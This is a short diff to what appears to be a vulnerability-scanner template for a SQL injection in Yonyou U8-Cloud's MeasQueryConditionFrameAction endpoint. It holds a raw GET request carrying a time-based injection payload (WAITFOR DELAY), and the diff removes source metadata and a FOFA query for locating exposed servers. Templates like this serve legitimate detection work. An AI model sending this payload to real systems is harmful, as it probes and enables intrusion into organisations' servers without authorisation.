@@ -3,12 +3,8 @@ info:
   name: 用友U8-Cloud系统接口MeasQueryConditionFrameAction存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lif7eu6crchurw6t'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lif7eu6crchurw6t
-    fofa: app="用友-U8-Cloud"
 http:
 - raw:
   - 'GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:5%27--+ HTTP/1.1
